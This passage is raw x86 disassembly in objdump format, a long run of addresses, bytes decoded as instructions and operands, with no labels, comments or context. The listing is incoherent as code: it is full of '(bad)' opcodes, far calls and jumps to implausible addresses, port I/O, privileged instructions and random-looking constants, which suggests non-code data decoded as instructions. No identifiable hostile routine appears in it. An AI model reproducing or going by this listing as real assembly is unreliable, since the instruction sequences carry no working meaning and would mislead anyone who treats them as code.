  420559:	jne    0x4205c9
  42055b:	repz or esp,0x7202bf7a
  420562:	sti    
  420563:	push   edi
  420564:	push   0xffffffdc
  420566:	ret    0x7cf7
  420569:	repz push ecx
  42056b:	jle    0x4205d5
  42056d:	and    al,0x43
  42056f:	fnsave ds:0x909e2579
  420575:	in     al,0x9f
  420577:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420578:	jbe    0x420514
  42057a:	call   0xd0e5:0xf585fa9f
  420581:	fs call 0x9308ff24
  420587:	cmp    al,0x1e
  420589:	jle    0x42052b
  42058b:	inc    edi
  42058c:	pusha  
  42058d:	imul   esi,DWORD PTR [esi+0x7df12a2c],0x4f
  420594:	pusha  
  420595:	pop    edi
  420596:	out    dx,al
  420597:	clc    
  420598:	imul   eax,DWORD PTR [ecx+0x147771b],0xf6396df5
  4205a2:	cmp    DWORD PTR [edi],ecx
  4205a4:	and    dl,BYTE PTR [edx-0x51]
  4205a7:	into   
  4205a8:	xor    ebx,DWORD PTR [edx-0x65d3a0c]
  4205ae:	jae    0x4205df
  4205b0:	ss mov al,0xcd
  4205b3:	inc    ecx
  4205b4:	sbb    esp,ecx
  4205b6:	cwde   
  4205b7:	scas   al,BYTE PTR es:[edi]
  4205b8:	(bad)  
  4205b9:	retf   0x5a6d
  4205bc:	cwde   
  4205bd:	dec    edi
  4205be:	enter  0x97ff,0xe4
  4205c2:	xor    edx,DWORD PTR [eax+0x8ab1220]
  4205c8:	pop    ecx
  4205c9:	mov    edi,0xf0bcea93
  4205ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205cf:	call   0xf25b:0x7e54ed1a
  4205d6:	push   ecx
  4205d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205d8:	pusha  
  4205d9:	push   0x98b1e71a
  4205de:	mov    ah,0xac
  4205e0:	sbb    al,0x37
  4205e2:	and    eax,0x7e9cf0b6
  4205e7:	lds    ebp,FWORD PTR ds:0x3b539e6d
  4205ed:	je     0x420660
  4205ef:	and    eax,0x6c322b58
  4205f4:	adc    edi,DWORD PTR [eax+0x7be5dafc]
  4205fa:	dec    ebx
  4205fb:	sti    
  4205fc:	mov    ebp,DWORD PTR [ecx-0x17a8b1f6]
  420602:	imul   ebx,DWORD PTR [edx+ecx*8],0x16
  420606:	rcl    ah,1
  420608:	(bad)  
  42060a:	rcr    DWORD PTR [edi+0x438d0bec],1
  420610:	jnp    0x420690
  420612:	jbe    0x420632
  420614:	push   cs
  420615:	xchg   ecx,eax
  420616:	add    BYTE PTR [edi-0x6d],dh
  420619:	pop    ebp
  42061a:	sbb    al,0x2c
  42061c:	popa   
  42061d:	pop    edx
  42061e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42061f:	cs mov al,0x60
  420622:	sbb    BYTE PTR [ebx+0x39],ch
  420625:	jmp    0x420611
  420627:	and    al,0xf0
  420629:	cmc    
  42062a:	aaa    
  42062b:	mov    ebx,0xc7f74b7
  420630:	js     0x420603
  420632:	jmp    0xb562c0c4
  420637:	cwde   
  420638:	and    BYTE PTR [ebx+0x2fc668da],cl
  42063e:	nop
  42063f:	adc    al,BYTE PTR [edi+eax*4+0x6566c3fe]
  420646:	jp     0x4205db
  420648:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420649:	jmp    0x420620
  42064b:	jg     0x4205d3
  42064d:	jae    0x4206a4
  42064f:	loop   0x42063e
  420651:	cmp    esp,esi
  420653:	xchg   ebp,eax
  420654:	test   eax,0x4ddc9686
  420659:	gs leave 
  42065b:	push   0x1aefb845
  420660:	mov    eax,ds:0xa073be16
  420666:	retf   
  420667:	stc    
  420668:	inc    esi
  420669:	mov    ch,0x19
  42066b:	arpl   WORD PTR [ecx-0x17286292],ax
  420671:	inc    esi
  420672:	jecxz  0x4206e7
  420674:	mov    dh,0x8f
  420676:	push   ebp
  420677:	outs   dx,BYTE PTR ds:[esi]
  420678:	(bad)  
  420679:	adc    bh,al
  42067b:	inc    esp
  42067c:	(bad)  
  42067d:	pop    ebp
  42067e:	adc    bh,BYTE PTR [ecx]
  420680:	movntq (bad),mm3
  420681:	out    0xdf,eax
  420683:	int    0xeb
  420685:	int3   
  420686:	xchg   edi,eax
  420687:	jbe    0x420643
  420689:	xor    bl,bl
  42068b:	pop    eax
  42068c:	jmp    0x1577:0xb33cb035
  420693:	mov    edx,0x892ad8ff
  420698:	retf   0xa0f9
  42069b:	fild   DWORD PTR [eax-0x67]
  42069e:	fs stos BYTE PTR es:[edi],al
  4206a0:	je     0x4206da
  4206a2:	or     al,0xf7
  4206a4:	adc    ebp,DWORD PTR [edx+0x3e934c3e]
  4206aa:	dec    esp
  4206ab:	outs   dx,BYTE PTR ds:[esi]
  4206ac:	(bad)  
  4206ad:	adc    edi,ebp
  4206af:	dec    edx
  4206b0:	inc    esp
  4206b1:	mov    al,0x5f
  4206b3:	adc    esp,DWORD PTR [edx*8+0x259efc88]
  4206ba:	mov    ah,0x6f
  4206bc:	stc    
  4206bd:	mov    eax,0xbd2dd4d
  4206c2:	cld    
  4206c3:	rcr    BYTE PTR [ebp+edi*2-0x73900324],0xa3
  4206cb:	dec    esp
  4206cc:	js     0x420716
  4206ce:	jnp    0x42074b
  4206d0:	fisttp DWORD PTR [esi+0x47164312]
  4206d6:	mov    BYTE PTR [ebx-0x3fd09c29],bh
  4206dc:	pop    ecx
  4206dd:	fisub  WORD PTR [ebx-0x4b]
  4206e0:	leave  
  4206e1:	inc    ebx
  4206e2:	push   ds
  4206e3:	push   esp
  4206e4:	sub    eax,DWORD PTR [ecx]
  4206e6:	stc    
  4206e7:	lods   eax,DWORD PTR ds:[esi]
  4206e8:	cmp    ecx,edx
  4206ea:	or     al,0xfd
  4206ec:	je     0x420702
  4206ee:	std    
  4206ef:	pop    edx
  4206f0:	dec    esi
  4206f1:	pusha  
  4206f2:	outs   dx,DWORD PTR ds:[esi]
  4206f3:	call   DWORD PTR [edx+ecx*1-0x14]
  4206f7:	hlt    
  4206f8:	jo     0x420727
  4206fa:	push   0xffffffe2
  4206fc:	pop    ebp
  4206fd:	push   ebp
  4206fe:	scas   al,BYTE PTR es:[edi]
  4206ff:	xor    ebp,eax
  420701:	or     DWORD PTR ds:0x91cd2095,ecx
  420707:	retf   
  420708:	sub    cl,dl
  42070a:	adc    eax,0xa3d7d4b2
  42070f:	dec    esi
  420710:	ds ret 
  420712:	mov    cl,0x7f
  420714:	lock test DWORD PTR [esi-0x1ee00972],ecx
  42071b:	inc    ebx
  42071c:	mov    edi,0x26e962cb
  420721:	mov    ecx,ecx
  420723:	aam    0xb8
  420725:	jns    0x420760
  420727:	mov    dh,0xe1
  420729:	dec    esp
  42072a:	ja     0x42079e
  42072c:	and    BYTE PTR [edx],0xd2
  42072f:	jl     0x420736
  420731:	lea    ebp,ds:0x23b53a6e
  420737:	inc    eax
  420738:	ja     0x420785
  42073a:	add    eax,0x9538735c
  42073f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420740:	test   al,0x7d
  420742:	and    BYTE PTR [edi],dl
  420744:	fldcw  WORD PTR ss:[ebp+0x53]
  420748:	call   0xc548:0x77ffcf6f
  42074f:	(bad)  
  420751:	jmp    0xa17c:0xc60c374e
  420758:	sub    DWORD PTR [eax+0x7982c095],0xffffffd3
  42075f:	aad    0x64
  420761:	ret    
  420762:	js     0x420789
  420764:	push   ss
  420765:	gs ins BYTE PTR es:[edi],dx
  420767:	push   ss
  420768:	push   ss
  420769:	push   0xae0aee2c
  42076e:	mov    BYTE PTR [eax+0x51],dl
  420771:	test   BYTE PTR [esi],cl
  420773:	lds    ebx,FWORD PTR [edi-0x12]
  420776:	push   ebp
  420777:	mov    dh,BYTE PTR [edi+0x5b]
  42077a:	xor    al,0xd6
  42077c:	mov    ds:0x5e7babc6,al
  420781:	add    BYTE PTR [eax-0x2947c579],dh
  420787:	mov    dh,0x98
  420789:	cmp    al,0x8e
  42078b:	xchg   edi,eax
  42078c:	add    eax,esp
  42078e:	es (bad) 
  420790:	fbstp  TBYTE PTR [eax+edi*8]
  420793:	outs   dx,BYTE PTR ds:[esi]
  420794:	mul    BYTE PTR [edx+eax*1-0x4121a427]
  42079b:	sbb    al,0x39
  42079d:	sbb    BYTE PTR [esi],al
  42079f:	or     DWORD PTR [edx+eax*1+0x1bb3ada8],edx
  4207a6:	in     al,0xf9
  4207a8:	mov    eax,ds:0x64270c97
  4207ad:	adc    edx,ebp
  4207af:	fnsave [ecx]
  4207b1:	pop    edx
  4207b2:	push   0xffffff82
  4207b4:	(bad)  
  4207b5:	out    0xf9,al
  4207b7:	aas    
  4207b8:	data16 jno 0x420803
  4207bb:	cmp    ecx,ebx
  4207bd:	scas   al,BYTE PTR es:[edi]
  4207be:	push   edi
  4207bf:	fmul   DWORD PTR [ebx+0x72]
  4207c2:	jp     0x420834
  4207c4:	rcr    BYTE PTR [edx],0xff
  4207c7:	adc    DWORD PTR [edx],0xffffffe9
  4207ca:	das    
  4207cb:	scas   al,BYTE PTR es:[edi]
  4207cc:	xor    ah,bh
  4207ce:	add    eax,0xb804c4f
  4207d3:	or     al,0xff
  4207d5:	or     BYTE PTR [ebx-0x5a540fb5],ch
  4207db:	xchg   ecx,eax
  4207dd:	popa   
  4207de:	push   eax
  4207df:	lahf   
  4207e0:	and    eax,0x6d318923
  4207e5:	jbe    0x420818
  4207e7:	inc    ebx
  4207e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207e9:	pop    es
  4207ea:	inc    edx
  4207eb:	in     eax,0xee
  4207ed:	push   edx
  4207ee:	sbb    ebp,edx
  4207f0:	les    ecx,FWORD PTR [ebx]
  4207f2:	pop    edx
  4207f3:	outs   dx,BYTE PTR ds:[esi]
  4207f4:	ins    BYTE PTR es:[edi],dx
  4207f5:	jmp    0x4207ba
  4207f7:	jne    0x4207e4
  4207f9:	out    0xd3,al
  4207fb:	or     BYTE PTR [ecx],al
  4207fd:	ss loopne 0x420805
  420800:	pop    esi
  420801:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420802:	dec    edx
  420803:	arpl   bp,bp
  420805:	outs   dx,DWORD PTR ds:[esi]
  420806:	and    cl,ah
  420808:	loop   0x4207ea
  42080a:	pop    ebx
  42080b:	jecxz  0x42086c
  42080d:	pop    ecx
  42080e:	mov    edi,0x2f1b4fce
  420813:	std    
  420814:	clc    
  420815:	call   0x1460:0x6dccfcf
  42081c:	es mov esp,0x7378489e
  420822:	loopne 0x4207c0
  420824:	sub    BYTE PTR ds:0xd65b6251,ch
  42082a:	add    bx,0x79
  42082e:	outs   dx,BYTE PTR ds:[esi]
  42082f:	dec    esp
  420830:	fmul   QWORD PTR [ecx-0x2c3b2a17]
  420836:	jno    0x42081f
  420838:	retf   
  420839:	ret    
  42083a:	fld    QWORD PTR [ecx+0x79]
  42083d:	gs aaa 
  42083f:	and    BYTE PTR [ecx-0x3a],cl
  420842:	call   0xc943:0x85e66a5c
  420849:	in     al,dx
  42084a:	xor    eax,0xc46aa1a1
  42084f:	ins    BYTE PTR es:[edi],dx
  420850:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420851:	sbb    ecx,edx
  420853:	daa    
  420854:	cli    
  420855:	jmp    0x420813
  420857:	pusha  
  420858:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420859:	pop    eax
  42085a:	pop    ebp
  42085b:	xchg   esp,eax
  42085c:	fdiv   st,st(5)
  42085e:	mov    dh,0x25
  420860:	fld    QWORD PTR [ebp-0x223b9d65]
  420866:	(bad)  
  420867:	dec    ecx
  420868:	and    ch,BYTE PTR [ebx+edi*1+0x3]
  42086c:	mov    edi,0x258a261d
  420871:	mul    BYTE PTR [ecx+0x5e398792]
  420877:	sub    al,0x52
  420879:	xor    dh,bl
  42087b:	enter  0x621b,0x9d
  42087f:	dec    esp
  420880:	xchg   ecx,eax
  420881:	inc    ebx
  420882:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420883:	int3   
  420884:	adc    cl,BYTE PTR [ebx+esi*4]
  420887:	sti    
  420888:	jb     0x420851
  42088a:	xchg   esi,eax
  42088b:	sub    DWORD PTR [ebx+eiz*8-0x427b9145],ebp
  420892:	dec    esp
  420893:	pusha  
  420894:	mov    eax,ds:0x4e29331f
  420899:	jge    0x4208f2
  42089b:	(bad)  
  42089c:	into   
  42089d:	js     0x42089a
  42089f:	rol    DWORD PTR [ebp+0x7f],0x70
  4208a3:	xlat   BYTE PTR ds:[ebx]
  4208a4:	loope  0x420896
  4208a6:	retf   0x17c3
  4208a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208aa:	mov    eax,ds:0x57a8355c
  4208af:	dec    esi
  4208b0:	sub    al,0xd8
  4208b2:	xchg   esp,eax
  4208b3:	nop
  4208b4:	ins    BYTE PTR es:[edi],dx
  4208b5:	mov    al,ds:0x6258ad39
  4208ba:	fist   WORD PTR [edx-0x48]
  4208bd:	push   es
  4208be:	mov    dh,BYTE PTR [eax+esi*8]
  4208c1:	sub    eax,0xcd9d19df
  4208c6:	push   es
  4208c7:	pop    ebx
  4208c8:	xlat   BYTE PTR ds:[ebx]
  4208c9:	inc    edx
  4208ca:	mov    dl,0xb9
  4208cc:	loope  0x420901
  4208ce:	cmp    ebx,edi
  4208d0:	and    ecx,DWORD PTR [ebx-0x66]
  4208d3:	cmp    DWORD PTR [ebx],esp
  4208d5:	pop    ebx
  4208d6:	fs jg  0x420869
  4208d9:	adc    eax,DWORD PTR [ebp-0x485c0da1]
  4208df:	in     al,0x87
  4208e1:	adc    eax,0xfd709525
  4208e6:	cmp    DWORD PTR ds:0x1fa457a3,eax
  4208ec:	(bad)  
  4208ed:	enter  0xd677,0xba
  4208f1:	jle    0x4208f5
  4208f3:	lahf   
  4208f4:	pop    eax
  4208f5:	jns    0x4208c2
  4208f7:	adc    eax,0x890a4b94
  4208fc:	mov    esp,0x30f00c51
  420901:	popf   
  420902:	push   0xdd0e8afd
  420907:	mov    eax,ds:0x1f28ee9e
  42090c:	sbb    BYTE PTR [esi+0x34b3695e],dl
  420912:	retf   
  420913:	fwait
  420914:	mov    cs,WORD PTR [edi]
  420916:	inc    ebp
  420917:	pop    ebp
  420918:	xor    edi,DWORD PTR [edi]
  42091a:	es xchg edi,eax
  42091c:	cmp    BYTE PTR [eax+0x52],0x55
  420920:	push   eax
  420921:	mov    dl,0xe6
  420923:	xor    edx,DWORD PTR [ecx+0x2c]
  420926:	adc    edi,eax
  420928:	dec    edi
  420929:	stos   DWORD PTR es:[edi],eax
  42092a:	sbb    BYTE PTR ds:[edx+0x79],ch
  42092e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42092f:	jne    0x42099c
  420931:	test   bh,al
  420933:	push   es
  420934:	sub    eax,0x97f422c0
  420939:	(bad)  
  42093a:	pusha  
  42093b:	aam    0x5b
  42093d:	pop    ebx
  42093e:	ins    DWORD PTR es:[edi],dx
  42093f:	adc    al,0x62
  420941:	adc    edx,ebx
  420943:	xor    DWORD PTR [eax],edx
  420945:	call   0x20edb885
  42094a:	(bad)  
  42094b:	adc    ah,BYTE PTR [esi+0x16]
  42094e:	xchg   edi,eax
  42094f:	arpl   WORD PTR [esi],dx
  420951:	add    BYTE PTR [esi],0xba
  420954:	sub    BYTE PTR [eax+0x41334c5f],0x66
  42095b:	mov    al,ds:0xf1edaf88
  420960:	ins    BYTE PTR es:[edi],dx
  420961:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420962:	lahf   
  420963:	sbb    al,0x6
  420965:	retf   
  420966:	jbe    0x42091f
  420968:	mov    bl,0xad
  42096a:	outs   dx,BYTE PTR ds:[esi]
  42096b:	dec    esp
  42096c:	mov    ch,0xc
  42096e:	mov    edx,0x45dacf7c
  420973:	or     DWORD PTR [ecx-0x7fdf211b],ebp
  420979:	adc    ah,cl
  42097b:	push   ecx
  42097c:	cwde   
  42097d:	jo     0x4209f8
  42097f:	add    eax,0x5a8c278a
  420984:	hlt    
  420985:	in     al,0x7c
  420987:	inc    ebx
  420988:	arpl   WORD PTR [ebx+eiz*8-0x2c],bx
  42098c:	dec    eax
  42098d:	mov    bh,ah
  42098f:	mov    ecx,0xe8bd76aa
  420994:	xchg   edi,eax
  420995:	mov    ch,0xbe
  420997:	jmp    0xfc553e2e
  42099c:	sahf   
  42099d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42099e:	and    eax,ebx
  4209a0:	inc    esp
  4209a1:	fsub   st,st(5)
  4209a3:	and    al,0xd2
  4209a5:	pop    edx
  4209a6:	leave  
  4209a7:	mov    bh,0xf4
  4209a9:	popf   
  4209aa:	test   DWORD PTR [eax-0x34b95394],ebp
  4209b0:	xor    DWORD PTR [eax+0x6a],ecx
  4209b3:	and    edx,DWORD PTR [ebp+0x39]
  4209b6:	xchg   BYTE PTR [edx],dh
  4209b8:	and    BYTE PTR [ecx-0x13],bh
  4209bb:	mov    ?,WORD PTR [edx]
  4209bd:	jne    0x4209a8
  4209bf:	rcl    ebx,cl
  4209c1:	ror    BYTE PTR [ebx-0x3c2710db],1
  4209c7:	jl     0x42094e
  4209c9:	pop    ebx
  4209ca:	stos   BYTE PTR es:[edi],al
  4209cb:	jno    0x420977
  4209cd:	mov    ebx,0xf459310a
  4209d2:	jne    0x420991
  4209d4:	enter  0x55f6,0x92
  4209d8:	lds    edx,FWORD PTR [edx]
  4209da:	xchg   edi,eax
  4209db:	adc    ah,BYTE PTR [esi-0x43]
  4209de:	pop    esp
  4209df:	inc    edx
  4209e0:	jp     0x420a09
  4209e2:	popa   
  4209e3:	rcl    DWORD PTR [edi],0xf0
  4209e6:	mov    bl,0x4
  4209e8:	div    BYTE PTR [ecx-0x7f0604eb]
  4209ee:	pop    ebp
  4209ef:	dec    esp
  4209f0:	xor    al,0xba
  4209f2:	std    
  4209f3:	iret   
  4209f4:	inc    ebp
  4209f5:	mov    ch,0x1c
  4209f7:	cwde   
  4209f8:	nop
  4209f9:	out    0xec,eax
  4209fb:	out    dx,eax
  4209fc:	push   0x1f
  4209fe:	or     al,0x7b
  420a00:	dec    ebp
  420a01:	daa    
  420a02:	adc    cl,BYTE PTR [ebx]
  420a04:	out    dx,eax
  420a05:	(bad)  ss:[esi]
  420a08:	or     al,0x53
  420a0a:	inc    eax
  420a0b:	fiadd  WORD PTR [edx+edi*4]
  420a0e:	inc    esp
  420a0f:	dec    esi
  420a10:	add    DWORD PTR [esi-0x50d97956],edi
  420a16:	push   cx
  420a18:	lahf   
  420a19:	(bad)  
  420a1b:	dec    esi
  420a1c:	out    dx,eax
  420a1d:	adc    al,0xf6
  420a1f:	nop
  420a20:	mov    DWORD PTR [edi-0x5a],0xa6671177
  420a27:	push   eax
  420a28:	gs in  eax,dx
  420a2a:	push   esp
  420a2b:	push   eax
  420a2c:	outs   dx,BYTE PTR ds:[esi]
  420a2d:	inc    ebp
  420a2e:	and    al,0x5e
  420a30:	sub    eax,0x2e1de692
  420a35:	push   es
  420a36:	dec    edx
  420a37:	sub    ch,BYTE PTR [ebp-0x3e]
  420a3a:	mov    eax,ds:0x1d017826
  420a3f:	mov    ch,0x81
  420a41:	repnz mov dh,0x29
  420a44:	jo     0x4209e5
  420a46:	popf   
  420a47:	push   ss
  420a48:	(bad)  
  420a4a:	push   edx
  420a4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a4c:	mov    ch,0x74
  420a4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a4f:	mov    esi,0x5db1247f
  420a54:	into   
  420a55:	pause  
  420a57:	xlat   BYTE PTR ds:[ebx]
  420a58:	imul   esi,DWORD PTR [edx+eiz*8-0x53],0x40
  420a5d:	jle    0x420acd
  420a5f:	dec    edx
  420a60:	xor    bl,BYTE PTR [edx+0xb24986b]
  420a66:	pop    edi
  420a67:	push   esp
  420a68:	cdq    
  420a69:	pop    ebp
  420a6a:	mov    bl,0x10
  420a6c:	mov    BYTE PTR [esi-0x1a358551],ch
  420a72:	xchg   edx,eax
  420a73:	ja     0x420a69
  420a75:	or     edx,DWORD PTR [ebp+ecx*8-0x9e0b91f]
  420a7c:	imul   DWORD PTR [edi-0x5f]
  420a7f:	es pop esp
  420a81:	retf   0x1ea5
  420a84:	mov    ah,0x27
  420a86:	scas   eax,DWORD PTR es:[edi]
  420a87:	or     BYTE PTR [ebx+ebx*1-0x29e62874],bh
  420a8e:	jmp    0x420a66
  420a90:	jmp    0x8b15a1e5
  420a95:	fld    QWORD PTR ds:0x891b7683
  420a9b:	les    esi,FWORD PTR [ebx]
  420a9d:	jbe    0x420af6
  420a9f:	enter  0xd1aa,0xe8
  420aa3:	(bad)  
  420aa6:	pop    ecx
  420aa7:	in     al,0x12
  420aa9:	fistp  WORD PTR [ecx-0x43e8dc64]
  420aaf:	ficomp WORD PTR [esi]
  420ab1:	push   ebp
  420ab2:	leave  
  420ab3:	cmp    ah,BYTE PTR [ecx-0x13338dc8]
  420ab9:	xchg   edi,eax
  420aba:	or     dl,dh
  420abc:	xchg   ebx,eax
  420abd:	into   
  420abe:	lahf   
  420abf:	or     DWORD PTR [edi+0x73],ebp
  420ac2:	in     al,0xb9
  420ac4:	(bad)  
  420ac5:	arpl   bp,bx
  420ac7:	outs   dx,BYTE PTR ds:[esi]
  420ac8:	repz inc ecx
  420aca:	mov    bl,0xe6
  420acc:	dec    esi
  420acd:	inc    ebx
  420ace:	xchg   ecx,eax
  420acf:	pop    eax
  420ad0:	aaa    
  420ad1:	cmp    cl,bh
  420ad3:	iret   
  420ad4:	sub    bh,BYTE PTR [edi+0x642b4b]
  420ada:	xchg   ebp,eax
  420adb:	popf   
  420adc:	inc    DWORD PTR [eax+0x4f]
  420adf:	dec    ebx
  420ae0:	aam    0x83
  420ae2:	and    al,BYTE PTR [edx+0x2c]
  420ae5:	mov    DWORD PTR [ebx+eiz*4+0x2b],0xfc434808
  420aed:	xor    BYTE PTR [ecx-0x64],0x41
  420af1:	inc    esp
  420af2:	stos   DWORD PTR es:[edi],eax
  420af3:	push   edx
  420af4:	pop    edx
  420af5:	and    edi,DWORD PTR [ecx]
  420af7:	fcomp  DWORD PTR [eax]
  420af9:	jne    0x420a92
  420afb:	rcl    edx,cl
  420afd:	xchg   BYTE PTR [edi],bh
  420aff:	push   ds
  420b00:	(bad)
  420b03:	add    ebx,DWORD PTR ds:0x42dc4795
  420b09:	fdiv   DWORD PTR [edi]
  420b0b:	aad    0x5
  420b0d:	sbb    esi,ebx
  420b0f:	mov    edi,esi
  420b11:	add    di,WORD PTR [eax+0x7788beb3]
  420b18:	popa   
  420b19:	mov    cl,0x93
  420b1b:	sahf   
  420b1c:	sbb    ebp,DWORD PTR [edx-0x7f]
  420b1f:	mov    DWORD PTR [ebp+0x3f],ecx
  420b22:	xchg   bl,dl
  420b24:	cmp    eax,0x992b8f87
  420b29:	adc    bl,cl
  420b2b:	pop    ebp
  420b2c:	jno    0x420acc
  420b2e:	jb     0x420b46
  420b30:	gs iret 
  420b32:	fcomp  QWORD PTR [edx+0x6ba1adc4]
  420b38:	stc    
  420b39:	sub    eax,0xf89c8303
  420b3e:	mov    ss,WORD PTR ds:0x9deda14b
  420b44:	jmp    0x4303:0x630812d6
  420b4b:	iret   
  420b4c:	call   ebx
  420b4e:	sbb    al,0x7e
  420b50:	push   es
  420b51:	(bad)  [esi+0x23]
  420b54:	adc    edx,eax
  420b56:	nop
  420b57:	out    dx,eax
  420b58:	and    BYTE PTR [edi+0x44],al
  420b5b:	adc    DWORD PTR [eax+0x42],esi
  420b5e:	mov    ebx,0xd2f2ad13
  420b63:	push   ecx
  420b64:	adc    DWORD PTR [edi+0x57],ebp
  420b67:	pushf  
  420b68:	pop    ecx
  420b69:	xor    ah,bh
  420b6b:	out    0x3d,eax
  420b6d:	inc    edi
  420b6e:	call   0xfb14:0xdf40b36
  420b75:	inc    ebp
  420b76:	inc    esp
  420b77:	pop    esi
  420b78:	add    edi,0x9d5cf2bc
  420b7e:	adc    DWORD PTR [ebx+0x40a5c79c],0x5b01f036
  420b88:	ror    DWORD PTR [edi-0x67],cl
  420b8b:	aam    0xb2
  420b8d:	inc    eax
  420b8e:	sbb    al,0x82
  420b90:	mov    eax,ds:0x648fd61
  420b95:	pop    edi
  420b96:	daa    
  420b97:	xchg   ebx,eax
  420b98:	inc    ecx
  420b99:	pop    ds
  420b9a:	sub    eax,0x6080e672
  420b9f:	pusha  
  420ba0:	pop    ds
  420ba1:	retf   0x54e3
  420ba4:	call   0x3f8180de
  420ba9:	cs in  al,dx
  420bab:	inc    edi
  420bac:	jb     0x420ba2
  420bae:	mov    eax,0xffcd5317
  420bb3:	cmp    eax,ecx
  420bb5:	or     ebp,DWORD PTR [ebp+0x254a6186]
  420bbb:	add    eax,0x98586b3
  420bc0:	iret   
  420bc1:	sub    ebx,esp
  420bc3:	fs scas eax,DWORD PTR es:[edi]
  420bc5:	jle    0x420c07
  420bc7:	sbb    BYTE PTR [ebx-0x5c],al
  420bca:	dec    eax
  420bcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bcc:	(bad)  
  420bcd:	neg    BYTE PTR [esi+0x1c]
  420bd0:	sub    al,0x57
  420bd2:	lahf   
  420bd3:	orps   xmm3,XMMWORD PTR [ebx+0x69]
  420bd7:	xor    ecx,DWORD PTR [eax+0x20339b26]
  420bdd:	inc    ecx
  420bde:	in     al,dx
  420bdf:	adc    BYTE PTR [ebx],ch
  420be1:	adc    eax,0xa9d95f8a
  420be6:	lods   eax,DWORD PTR ds:[esi]
  420be7:	sbb    eax,0x6f28e38
  420bec:	iret   
  420bed:	sbb    al,0x5a
  420bef:	and    al,dh
  420bf1:	ficom  DWORD PTR [eax+0x2b4da947]
  420bf7:	xor    al,0x57
  420bf9:	data16 or al,0xe
  420bfc:	jg     0x420bee
  420bfe:	cmp    cl,BYTE PTR [eax]
  420c00:	push   ss
  420c01:	and    BYTE PTR [edi+0x6b],0x57
  420c05:	push   es
  420c06:	cwde   
  420c07:	ja     0x420c33
  420c09:	mov    esi,0xbf0831b5
  420c0e:	test   al,0xef
  420c10:	push   eax
  420c11:	sub    ebp,DWORD PTR [edx-0x1c66cbf3]
  420c17:	and    ecx,ebp
  420c19:	dec    edi
  420c1a:	aam    0x12
  420c1c:	dec    BYTE PTR [ebp+0x13]
  420c1f:	shr    DWORD PTR [eax-0xf1abf47],0x26
  420c26:	pop    ss
  420c27:	lahf   
  420c28:	ret    
  420c29:	cmc    
  420c2a:	jmp    0x420ca3
  420c2c:	add    al,0x2a
  420c2e:	xchg   ecx,eax
  420c2f:	adc    ebp,eax
  420c31:	sti    
  420c32:	call   0x489:0xcbda8793
  420c39:	call   edi
  420c3b:	jmp    0x420c07
  420c3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c3e:	sbb    DWORD PTR [esi-0x8ba6781],ebp
  420c44:	mov    eax,ds:0xba6c221
  420c49:	std    
  420c4a:	xor    al,0xc7
  420c4c:	ins    BYTE PTR es:[edi],dx
  420c4d:	hlt    
  420c4e:	mov    dh,0x82
  420c50:	adc    al,0x4e
  420c52:	shl    cl,1
  420c54:	jno    0x420c5a
  420c56:	xchg   ecx,eax
  420c57:	gs nop
  420c59:	push   esi
  420c5a:	int    0xda
  420c5c:	adc    eax,0xdd893cb9
  420c61:	mov    edx,0x5cbec9b7
  420c66:	lods   eax,DWORD PTR ds:[esi]
  420c67:	sub    ecx,DWORD PTR [eax-0x70]
  420c6a:	test   BYTE PTR [edx],al
  420c6c:	xor    al,0x6e
  420c6e:	mov    cl,0x34
  420c70:	push   esp
  420c71:	add    edx,DWORD PTR [edi-0x42]
  420c74:	scas   eax,DWORD PTR es:[edi]
  420c75:	test   eax,0xc26f7cc1
  420c7a:	jnp    0x420ce3
  420c7c:	push   es
  420c7d:	out    dx,eax
  420c7e:	inc    esp
  420c7f:	push   cs
  420c80:	and    BYTE PTR [esi+ebp*1-0x1b7801f5],cl
  420c87:	mov    WORD PTR [edi+esi*8],cs
  420c8a:	jle    0x420ce1
  420c8c:	int3   
  420c8d:	and    al,0x2c
  420c8f:	leave  
  420c90:	xor    al,0x1
  420c92:	das    
  420c93:	xor    eax,0xe6a701e9
  420c98:	and    BYTE PTR [ebx],cl
  420c9a:	pop    esi
  420c9b:	sub    BYTE PTR [edx],bl
  420c9d:	sbb    BYTE PTR [ecx+0x3b],dh
  420ca0:	push   cs
  420ca1:	test   DWORD PTR [ecx+0x7e],ebp
  420ca4:	je     0x420d13
  420ca6:	sbb    DWORD PTR [ebp-0x206ca046],esp
  420cac:	stos   DWORD PTR es:[edi],eax
  420cad:	ins    DWORD PTR es:[edi],dx
  420cae:	out    0x2c,eax
  420cb0:	mov    ch,0x8a
  420cb2:	aam    0xf3
  420cb4:	xor    al,0x5d
  420cb6:	sub    al,0x97
  420cb8:	sub    ebp,DWORD PTR [edi+0x60]
  420cbb:	adc    al,0xaa
  420cbd:	dec    esi
  420cbe:	adc    bl,BYTE PTR [ecx+0x4f656adf]
  420cc4:	cdq    
  420cc5:	mov    edx,0x6baedf7d
  420cca:	pop    esi
  420ccb:	xchg   edi,eax
  420ccc:	dec    dh
  420cce:	mov    ebp,0xd88fedc0
  420cd3:	inc    ebp
  420cd4:	aas    
  420cd5:	cmp    DWORD PTR [esi-0x639f55c6],edi
  420cdb:	cld    
  420cdc:	push   edi
  420cdd:	cwde   
  420cde:	xor    DWORD PTR [edx],esp
  420ce0:	(bad)
  420ce4:	rcr    BYTE PTR [edx-0x1e],0x8c
  420ce8:	push   ds
  420ce9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
